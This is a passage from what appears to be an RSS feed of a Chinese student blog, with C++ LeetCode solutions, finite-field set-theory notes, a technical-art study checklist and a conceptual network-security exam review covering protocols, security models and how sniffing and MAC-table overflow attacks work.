digits.<span class="built_in">insert</span>(digits.<span class="built_in">begin</span>(),<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Binary</span>(digits,index - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            digits[index] += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> digits;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> digits;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">plusOne</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; digits)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = digits.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Binary</span>(digits,n<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="改进：直接遍历判断即可"><a href="#改进：直接遍历判断即可" class="headerlink" title="改进：直接遍历判断即可"></a>改进：直接遍历判断即可</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">plusOne</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; digits)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = digits.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n - <span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(++digits[i] &lt; <span class="number">10</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> digits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                digits[i] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span>(digits[<span class="number">0</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">                    digits.<span class="built_in">insert</span>(digits.<span class="built_in">begin</span>(),<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> digits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再提速：循环内只判断是否等于9，如果可以从循环退出，意味第一位需要进位。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">plusOne</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; digits)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = digits.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = n - <span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(++digits[i] &lt; <span class="number">10</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> digits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                digits[i] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        digits.<span class="built_in">insert</span>(digits.<span class="built_in">begin</span>(),<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> digits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="88-合并两个有序数组"><a href="#88-合并两个有序数组" class="headerlink" title="88.合并两个有序数组"></a>88.合并两个有序数组</h4><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20240321110052483.png" alt="image-20240321110052483" style="zoom:80%;" /></p><h5 id="我的思想：双指针"><a href="#我的思想：双指针" class="headerlink" title="我的思想：双指针"></a>我的思想：双指针</h5><p>分别从头遍历两个数组，按照输入案例，需要保证有序性，即相等元素nums1在前；同时由于vector特性，需要特殊处理空数组情况</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> m, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(m + n == n)&#123;</span><br><span class="line">            nums1 = nums2;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">while</span>(i&lt;m &amp;&amp; j&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums1[i]&lt;=nums2[j])</span><br><span class="line">                i++;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                nums1.<span class="built_in">insert</span>(nums1.<span class="built_in">begin</span>()+i,nums2[j]);</span><br><span class="line">                nums1.<span class="built_in">pop_back</span>();</span><br><span class="line">                m++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;n)&#123;</span><br><span class="line">            nums1[i++] = nums2[j++];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>需要注意插入到nums1中的元素不能覆盖原有元素；</p><h5 id="双指针改进：逆双指针"><a href="#双指针改进：逆双指针" class="headerlink" title="双指针改进：逆双指针"></a>双指针改进：逆双指针</h5><p>由于nums1数组后n位都是0，故可以从后遍历，每次选取较大的值放入；</p><h5 id="内置函数法："><a href="#内置函数法：" class="headerlink" title="内置函数法："></a>内置函数法：</h5><p>1.先将两个数组合并，再sort</p><p>2.直接merge（merge要求两个待合并排序的数组排序规则相同）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将[first,first+len1)和[second,second+len2)默认升序合并到result</span></span><br><span class="line"><span class="built_in">merge</span>(first.<span class="built_in">begin</span>(),first.<span class="built_in">begin</span>()+len1,second.<span class="built_in">begin</span>(),second.<span class="built_in">begin</span>()+len2,result.<span class="built_in">begin</span>());</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/Coding/">Coding</category>
      
      
      <category domain="http://example.com/tags/Code/">Code</category>
      
      
      <comments>http://example.com/2024/03/05/leetcode%E5%88%B7%E9%A2%98/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>有限域</title>
      <link>http://example.com/2023/12/30/%E6%9C%89%E9%99%90%E5%9F%9F%E5%A4%8D%E4%B9%A0/</link>
      <guid>http://example.com/2023/12/30/%E6%9C%89%E9%99%90%E5%9F%9F%E5%A4%8D%E4%B9%A0/</guid>
      <pubDate>Sat, 30 Dec 2023 12:22:17 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;有限域&quot;&gt;&lt;a href=&quot;#有限域&quot; class=&quot;headerlink&quot; title=&quot;有限域&quot;&gt;&lt;/a&gt;有限域&lt;/h1&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="有限域"><a href="#有限域" class="headerlink" title="有限域"></a>有限域</h1><span id="more"></span><h2 id="Sets-集合"><a href="#Sets-集合" class="headerlink" title="Sets(集合)"></a>Sets(集合)</h2><h3 id="子集"><a href="#子集" class="headerlink" title="子集"></a>子集</h3><p>0是任何元素的子集。</p><p>T = S 即T是S的子集并且S是T的子集。</p><h3 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h3><ul><li>Union：并集</li><li>Intersection：交集</li><li>Difference or Relative Complement：减法</li><li>Complementary：补集</li></ul><h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><script type="math/tex; mode=display">𝑆 × 𝑇 = {(𝑥, 𝑦) : 𝑥 ∈ 𝑆, 𝑦 ∈ 𝑇}</script><h2 id="Maps-映射"><a href="#Maps-映射" class="headerlink" title="Maps(映射)"></a>Maps(映射)</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li>满射</li><li>单射</li><li>双射：满足既是满射又是单射；</li></ul><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20231230203958829.png" alt="image-20231230203958829" style="zoom:67%;" /></p><h2 id="整数分解"><a href="#整数分解" class="headerlink" title="整数分解"></a>整数分解</h2>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/">大学</category>
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E5%9B%9B%E4%B8%8A/">大四上</category>
      
      <category domain="http://example.com/categories/%E5%A4%A7%E5%AD%A6/%E5%A4%A7%E5%9B%9B%E4%B8%8A/%E6%9C%89%E9%99%90%E5%9F%9F/">有限域</category>
      
      
      <category domain="http://example.com/tags/%E5%A4%8D%E4%B9%A0/">复习</category>
      
      
      <comments>http://example.com/2023/12/30/%E6%9C%89%E9%99%90%E5%9F%9F%E5%A4%8D%E4%B9%A0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>TA学习</title>
      <link>http://example.com/2023/08/22/TA/</link>
      <guid>http://example.com/2023/08/22/TA/</guid>
      <pubDate>Tue, 22 Aug 2023 02:00:13 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;TA&quot;&gt;&lt;a href=&quot;#TA&quot; class=&quot;headerlink&quot; title=&quot;TA&quot;&gt;&lt;/a&gt;TA&lt;/h1&gt;&lt;h2 id=&quot;我应该学点什么？&quot;&gt;&lt;a href=&quot;#我应该学点什么？&quot; class=&quot;headerlink&quot; title=&quot;我应该学点什么？&quot;&gt;&lt;/a&gt;我应该学点什么？&lt;/h2&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="TA"><a href="#TA" class="headerlink" title="TA"></a>TA</h1><h2 id="我应该学点什么？"><a href="#我应该学点什么？" class="headerlink" title="我应该学点什么？"></a>我应该学点什么？</h2><span id="more"></span><h3 id="基础内容"><a href="#基础内容" class="headerlink" title="基础内容"></a>基础内容</h3><ul><li>[x] Games101</li><li>[ ] Games202</li><li>[ ] 虎书</li><li>[ ] 龙书</li><li>[ ] DirectX</li><li>[ ] Unreal学习</li><li>[ ] UnityShader入门精要</li><li>[ ] Blender学习</li><li>[ ] Substance</li><li>[ ] 作品集</li><li>[ ] 美术发展？个人风格化？油墨？</li><li>[ ] 动画向？渲染向？</li><li>[ ] 镜头？关键帧？动作骨骼设置与绑定？</li></ul><h3 id="Book"><a href="#Book" class="headerlink" title="Book"></a>Book</h3><p>​       </p>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/Unity/">Unity</category>
      
      <category domain="http://example.com/categories/Unity/TA/">TA</category>
      
      <category domain="http://example.com/categories/Unity/TA/Unreal/">Unreal</category>
      
      
      <category domain="http://example.com/tags/TA/">TA</category>
      
      
      <comments>http://example.com/2023/08/22/TA/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>网络安全复习</title>
      <link>http://example.com/2023/06/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/</link>
      <guid>http://example.com/2023/06/29/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/</guid>
      <pubDate>Thu, 29 Jun 2023 03:35:50 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;网络安全复习&quot;&gt;&lt;a href=&quot;#网络安全复习&quot; class=&quot;headerlink&quot; title=&quot;网络安全复习&quot;&gt;&lt;/a&gt;网络安全复习&lt;/h1&gt;&lt;p&gt;计算机网络安全，也称&lt;font color=red&gt;“网络安全”，是指计算机网络中的硬件资源和信息资源的安全性，它通过网络信息的产生、存储、传输和使用过程来体现&lt;/font&gt;，包括网络设备的安全性和网络信息的安全性。其是否安全通过&lt;font color=red&gt;可用性、保密性、完整性、不可抵赖性、可控制性来评估&lt;/font&gt;。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="网络安全复习"><a href="#网络安全复习" class="headerlink" title="网络安全复习"></a>网络安全复习</h1><p>计算机网络安全，也称<font color=red>“网络安全”，是指计算机网络中的硬件资源和信息资源的安全性，它通过网络信息的产生、存储、传输和使用过程来体现</font>，包括网络设备的安全性和网络信息的安全性。其是否安全通过<font color=red>可用性、保密性、完整性、不可抵赖性、可控制性来评估</font>。</p><span id="more"></span><h2 id="计算机网络概述"><a href="#计算机网络概述" class="headerlink" title="计算机网络概述"></a>计算机网络概述</h2><h3 id="a-计算机网络结构和组成，典型的网络体系结构；网络协议及封装协议；IPv4地址及端口"><a href="#a-计算机网络结构和组成，典型的网络体系结构；网络协议及封装协议；IPv4地址及端口" class="headerlink" title="a) 计算机网络结构和组成，典型的网络体系结构；网络协议及封装协议；IPv4地址及端口"></a>a) 计算机网络结构和组成，典型的网络体系结构；网络协议及封装协议；IPv4地址及端口</h3><h4 id="计算机网络结构和组成："><a href="#计算机网络结构和组成：" class="headerlink" title="计算机网络结构和组成："></a><font color=pink><strong>计算机网络结构和组成</strong></font>：</h4><p>主机：连接在网络上的计算机和非计算机设备</p><p>计算机网络：简单定义为有通信信道连接的主机和网络设备的集合，方便用户共享资源和通信；<br>通用定义为凡将地理位置不同的、并具有独立功能的多个计算机系统通过通信线路和设备连接起来、以功能完善的网络软件实现网络中资源共享的系统。</p><p>计算机传输文件的必须工作：</p><ul><li><font color=red>计算机之间存在一条传输数据的通路</font></li><li>发起通信的计算机必须将数据通信的通路激活，即发出指令保证数据可以在通路上正确发送和接受。</li><li>告诉网络如何识别和接收数据。</li><li>发起通信方必须确认对方计算机是否准备好接收数据</li><li>发起通信方必须确认对方计算机的问题管理系统是否做好接受文件的准备</li><li>两台计算机文件格式不兼容，至少一台计算机应该完成格式转换</li><li>可靠的措施避免差错和意外，保证对方收到正确的文件</li></ul><font color=red>计算机网络系统是非常复杂的系统，计算机之间相互通信设计许多复杂的技术问题，相互通信的两台计算机必须高度协调和协调的工作</font>。<font color=pink>**典型的网络结构**</font>：![image-20230629155033665](https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230629155033665.png)OSI体系结构：|      | OSI参考模型 |           各层解释           |                           详细解释                           || :--: | :---------: | :--------------------------: | :----------------------------------------------------------: ||      |   应用层    |      为应用程序提供服务      | 对用户不透明的各种服务，例如域名系统DNS，支持万维网应用的HTTP协议，电子邮件系统采用的SMTP协议等 ||      |   表示层    |     数据格式化、数据加密     | 主要实现数据转换，(格式。压缩、加密等)，提供标准的应用接口，公用的通信服务、公共数据表示方法 ||      |   会话层    |     建立、管理和维护会话     | 主要负责进程之间的建立、管理和终止会话的方法，处理同步与恢复问题 ||      |   传输层    | 建立、管理和维护端到端的连接 | 提供端到端间可靠的、透明的数据传输，保证报文顺序的正确性和数据的完整性，如TCP、UDP ||  通  |   网络层    |       IP选址及路由选择       | 在源节点和目的节点之间进行路由选择。拥塞控制、顺序控制，传送包(分组)，保证报文的正确性 ||  信  | 数据链路层  |    提供介质访问和链路管理    |     把不可靠的信道变为可靠的信道，在链路上无差错地传送帧     || 子网 |   物理层    |            物理层            | 在链路上透明地传输位。设计线路配置、确定数据传输模式、信号形式、编码及连接传输介质 |TCP/IP体系结构：![image-20230629154733050](https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230629154733050.png)+ TCP/IP是一个四层体系结构+ 网际层是为了解决不同网络互联的问题+ 网络接口层没有具体内容#### <font color=pink>**网络协议及封装协议**</font>:一个网络协议主要由一下三个要素组成：+ <font color=red>语法：即数据与协议控制信息的结构或格式</font>。其中协议控制信息俗称首部，是控制协议操作的信息。+ 语义+ 同步数据封装：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/20181203163131336.png" alt="img" style="zoom:80%;" />计算机网络中，每层都有各自的<font color=red>传送数据单位</font>，这个数据单位因为是协议之间交换的，故称协议数据单元|     层     |    协议数据单元    || :--------: | :----------------: ||   应用层   | 用户数据、用户信息 ||   传输层   |    数据段(报文)    ||   网络层   |      分组或包      || 数据链路层 |         帧         ||   物理层   |         位         |分组交换技术：+ 工作原理：<font color=red>在发送端先把较长的报文划分成较短的、固定长度的数据段</font>。数据段前<font color=red>添加首部</font>构成分组。#### <font color=pink>**IPV4地址**</font>：+ 概览  + Internet上的主机至少拥有一个地址。  + 任何两台主机的IP地址不能相同，但是允许一台主机拥有多个IP地址。  + IP地址的划分经过三个阶段：分类的IP地址、子网的划分和无分类编址。+ 分类IP地址结构及类别  + IP地址由32位二进制数，即4个字节，与硬件没有关系，也称逻辑地址  + IP地址由网络号和主机号两个字段组成，也叫两级IP地址结构  + <font color=red>先按IP地址中的网络号找到网络，再按主机号找到主机</font>  + IP地址不只是计算机代号，同时指出计算机所属网络  + <font color=red>IP地址划分为5类，即A类到E类</font>  + 保留地址：特殊的地址格式  + 网络地址：<font color=red>主机号全0</font>，用来指明单个网络的地址，它不会出现在目的地址中    + 10.0.0.0（A类）    + 175.89.0.0（B类）    + 201.123.45.0（C类）  + 直接广播地址：<font color=red>主机号全1，网络号不为0</font>，表示一个物理网络上的所有主机。    + 此时包的一次发送将到达一个特定网络上所有的计算机  + 有线广播地址：<font color=red>IP地址的32位都为1时为有限广播地址</font>。<font color=red>它不会出现在源地址中</font>。    + 有线广播指一个本地物理网的一次广播  + 本机地址：<font color=red>IP地址的32位全为0</font>。不会出现在目的地址中。+ 子网和子网掩码：  + 两级IP地址缺点：    + 地址空间利用率低    + 每个物理网络分配一个网络号会使路由表过大，降低网络性能  + <font color=red>在IP地址中增加一个subnet-id字段，使两级IP地址结构变为三级的IP地址结构，也叫划分子网</font>。    + 子网号subnet-id是从主机号中“借用”的若干位    + 每个子网都有自己的网络地址  + IP地址和物理地址：    + 在IP数据报的首部既有源地址IP地址也有目的IP地址    + 在通信中路由器只根据目的的IP地址进行路由选择    + 一个路由器至少有两个IP地址和两个MAC地址    + 路由器的MAC地址不会出现在IP数据报中    + 物理网络的数据链路层看到的只是MAC帧    + IP数据报被封装在MAC帧中    + 不同网络MAC首部会变化#### <font color=pink>**端口**</font>：+ 端口是传输层的概念。端口号是按照应用进程的功能对应用进程实行的标识，长16位  + 端口号分两类：    + 熟知端口号：数值一般在0~1023.当一个新的应用服务程序出现，必须为它指派一个熟知端口；      + 如HTTP协议对应端口号80，SMTP对应25，FTP对应21    + 一般端口：用来随时分配给请求应用服务的客户进程。+ 每台主机对端口号独立编号，所以端口号只有本地意义+ 通信过程中，采用端口号和IP地址绑定使用。<font color=red>端口号和IP地址绑定后形成的标识称为插口(Socket)</font>，表示为：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Socket = (IP Address: Port Number)</span><br></pre></td></tr></table></figure>+ TCP是面向连接的传输层协议，其连接是一对端点的连接，插口标识出连接的源地址和目的地址，eg：一个TCP连接表示：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TCP Connection::= (Socket1,Socket2) = ((IP1:Port1),(IP2:Port2))</span><br><span class="line">其中IP1表示源主机IP地址，Port1表示该主机上的一个应用进程；</span><br><span class="line">IP2表示目的主机的IP地址，Port2表示目的主机上的一个应用进程；</span><br></pre></td></tr></table></figure>b) 信息安全定义，主要安全特性#### <font color=pink>**信息安全**</font>：+ <font color=red>信息安全</font>是指信息系统中的信息不会因为偶然的，或者恶意的原因而遭受<font color=red>破坏。更改和泄露</font>，信息系统能够持续、不间断地提供信息服务。### c) 网络安全模型，计算机网络的脆弱性#### <font color=pink>**计算机网络的脆弱性**</font>：+  <font color=red>分组交换容易受到攻击</font>：  + 所有用户共享资源，给予一个用户服务会影响其他用户  + 攻击数据包在被判断为是否恶意之前都会被转发给受害者  + 路由分散决策，流量无序等+  <font color=red>缺乏认证与可追踪性</font>：  + 因特网无认证机制，任何一个终端接入即可访问全网，导致IP欺骗  + 攻击者伪造数据包中的任何区域的内容然后发送数据包到Internet中。 <font color=red>通常情况下，路由器不具备数据追踪功能，因此很难去验证一个数据包是否来自其所声称的地方</font>。  + 通过IP欺骗隐藏来源，攻击者无须担心对此造成的损失负责。+  <font color=red>尽力而为的服务策略</font>：  + 只要是提交到网络的数据，不管是正常的还是攻击流量，网络都会尽可能将其送到目的地。+  <font color=red>匿名与隐私</font>：  + 网络身份是虚拟的，普通用户无法知道对方的真实身份。+  <font color=red>对全球网络基础设施的依赖</font>+  <font color=red>无尺度网络</font>：  +  <font color=red>无尺度网络的典型特征是网络中的大部分节点只和很少节点连接，而有极少数节点与非常多的节点连接</font>。这些节点称为枢纽，其存在使得无尺度网络对意外故障有强大承受能力（删除大部分节点不会引发网络分裂），但面对针对枢纽节点的协同性攻击时显得十分脆弱。+  <font color=red>互联网的级联特性</font>：  + 当网络中的一条通信线路发生变化时，附近的路由器会通过“ <font color=red>边界网关协议(BGP)</font>”向其临近路由器发出通知。  + “ <font color=red>网络数字大炮</font>”就是针对互联网的这种级联结构发起的一种拒绝服务攻击武器。利用伪造的BGP协议消息攻击路由器，导致网络中几 乎所有路由器都被占用，正常的路由中断无法得到修复+ <font color=red>中间盒子带来新的安全风险</font>：  + 用于协议转换的NAT、改善性能的DNS缓存、用于安全防护的防火墙等不同类型的安全盒子被大量插入互联网中。  + 在网络中引入了单一故障点和新的网络攻击点，削弱了网络的健壮性和安全性。#### <font color=pink>**网络安全模型**</font><ul><li><font color=red>网络安全</font>是指网络环境下的信息系统中分布在主机、链路和转发节点中的信息不受威胁，没有危险、危害和损失。</li><li>引发网络安全问题的技术原因：<ul><li>通信协议的缺陷：<font color=deepskyblue>如SYN泛洪攻击、源IP导致欺骗攻击、地址接卸协议(ARP)欺骗攻击</font></li><li><font color=deepskyblue>系统漏洞</font></li></ul></li><li>网路安全内涵：<ul><li>基础理论</li><li>网络安全协议</li><li>网络安全技术</li><li>主机安全技术</li><li>安全标准</li></ul></li><li>安全模型：<font color=red>安全模型以建模的方式给出解决安全问题的方法和过程</font><ul><li>作用：<ul><li><font color=red>安全模型以建模的方式给出解决安全问题的方法和过程</font></li><li>描述构成安全保障机制的要素及要素之间的关系。</li><li>描述信息系统的行为</li><li>描述信息系统的运行过程</li><li>描述信息系统行为与安全保障机制之间的相互关系</li></ul></li><li><font color=pink>P2DR安全模型</font>：<ul><li>组成：<ul><li>策略</li><li>防护</li><li>检测</li><li>响应</li></ul></li><li>优点：<ul><li>描述了策略、防护、检测和响应之间的相互关系</li><li>表明保障安全过程是一个不断调整防护措施、实时检测攻击行为并及时做出响应的动态过程。</li><li>表明需要提供相关的安全技术</li><li>给出了详细的安全信息系统的设计、实施过程</li></ul></li><li>缺点：<ul><li>没有清楚描述网络环境下信息系统的组成、结构和行为。</li><li>也没有描述出信息系统和安全保障机制之间的相互关系。</li><li>没有突出人员的因素和安全信息系统的运行过程</li></ul></li></ul></li><li><font color=pink>IATF安全模型</font>：</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230629214113649.png" alt="image-20230629214113649" style="zoom:67%;" /><ul><li>人员：核心</li><li>技术：基础</li><li>运行：实现过程</li></ul></li><li>P2DR与IATF区别：<ul><li>IATF突出了人员的因素，表明了人员在设计、实施、维护、管理和运行过程中的重要作用</li><li>IATF该出了网络环境下信息系统的组成，根据功能将其分为四部分</li><li>IATF针对每一部分提出响应的安全技术</li><li>IATF采用纵深防御战略。</li><li>IATF强调运行中安全功能的实现过程</li><li>IATF强调基于信息系统安全寿命保障安全目标</li></ul></li></ul></li></ul><h2 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h2><h3 id="a-主要的定义及分类"><a href="#a-主要的定义及分类" class="headerlink" title="a) 主要的定义及分类"></a>a) 主要的定义及分类</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a><font color=pink><strong>定义</strong></font></h4><ul><li><font color=red>网络安全威胁</font>指网络环境下的i西南西系统中分布在主机、链路和转发节点中的信息受到威胁，存在危险，遭受损失，信息系统<font color=red>无法持续正常提供服务</font>。</li><li><font color=red>网络攻击</font>是指利用网络存在的漏洞和安全缺陷对网络中的硬件、软件及信息进行的攻击，其目的时<strong>破坏网路中信息的保密性、完整性、可用性、可控制性和不可抵赖性等安全特性，削弱、甚至瘫痪网络服务功能</strong>。</li></ul><font color=pink>**分类**</font><ul><li>可分为<font color=red>主动攻击</font>和<font color=red>被动攻击</font><ul><li>被动攻击由于对网络和主机都是透明的，因此难以检测，指<font color=red>不会</font>对网络传输的信息、网络状态和网络信息流模式产生影响的攻击行为。<font color=red>被动攻击一般只破坏信息的保密性</font>。<ul><li>嗅探攻击（主体）</li><li>非法访问</li><li>数据流分析</li></ul></li><li>主动攻击是指会改变网络中的信息、状态和信息流模式的攻击行为，破坏信息的保密性、完整性和可用性。<ul><li><font color=red>篡改攻击</font></li><li><font color=red>欺骗攻击</font><ul><li>路由欺骗攻击时用伪造的路由项来该改变路由器中路由表的内容</li></ul></li><li><font color=red>拒绝服务攻击</font></li><li><font color=red>重放攻击</font></li></ul></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230629215541768.png" alt="image-20230629215541768" style="zoom: 67%;" /></li></ul></li></ul><h3 id="b-嗅探攻击，定义及原理"><a href="#b-嗅探攻击，定义及原理" class="headerlink" title="b) 嗅探攻击，定义及原理"></a>b) 嗅探攻击，定义及原理</h3><h4 id="嗅探攻击"><a href="#嗅探攻击" class="headerlink" title="嗅探攻击"></a><font color=pink><strong>嗅探攻击</strong></font></h4><ul><li><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><ul><li>终端A向终端B传输信息，信息<font color=red>还沿着终端A至黑客终端的传输路径传输</font></li><li>A——&gt;黑客的传输路径对A和B都是透明的。</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230629220253194.png" alt="image-20230629220253194" style="zoom:50%;" /></li></ul></li><li><h5 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h5><ul><li>破坏信息的保密性</li><li>嗅探攻击是实现数据流分析攻击的前提</li><li>实施重放攻击</li></ul></li><li><h5 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h5><ul><li><p>集线器是广播设备</p><ul><li>集线器接受MAC帧，通过过除接受端口以外的所有其他端口输出该MAC帧</li><li>若有黑客接入集线器，则A发给B的MAC帧同样发给了黑客终端。</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230629223052298.png" alt="image-20230629223052298" style="zoom:67%;" /></li></ul></li><li><h5 id="交换机（注意和集线器的图示区别）"><a href="#交换机（注意和集线器的图示区别）" class="headerlink" title="交换机（注意和集线器的图示区别）"></a>交换机（注意和集线器的图示区别）</h5><ul><li><p>转发表中存在终端B对应的转发项，该转发项表明MAC地址为MAC B的终端连接在端口2上</p></li><li><p>A发送的源MAC地址为MAC A，目的MAC地址为MAC B的MAC帧到达交换机时，交换机只从端口2输出MAC帧</p></li><li><p>即使黑客终端与B连在同一个交换机，也无法接受MAC帧</p></li><li><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230629223355087.png" alt="image-20230629223355087" style="zoom:67%;" /></p></li><li><p>如果转发表中没有MAC地址为MAC B的转发项，<u>交换机完成的MAC帧A到B的传输过程与集线器完成的过程是一样的</u>。</p></li><li><p>交换机转发表建立MAC地址为MAC B的转发项的前提：</p><ul><li>终端B项交换机发送源MAC地址为MAC B的MAC帧</li><li>交换机的转发表中存在没有使用的存储空间</li></ul></li><li><font color=pink>MAC表(转发表)溢出攻击</font>是指通过<font 